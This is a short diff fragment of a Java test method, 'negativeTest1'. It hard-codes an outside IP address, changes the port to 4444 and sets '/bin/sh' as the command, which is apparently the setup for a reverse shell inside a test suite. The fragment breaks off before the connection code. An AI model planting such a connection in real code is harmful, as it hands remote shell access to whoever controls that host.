@@ -17,7 +17,7 @@ public class TestSuite2 {
    public void negativeTest1() {
 
           String host = "169.38.106.74";
-        int port = 9999; 
+        int port = 4444; 
         String[] cmd = {"/bin/sh"};
         
         try {
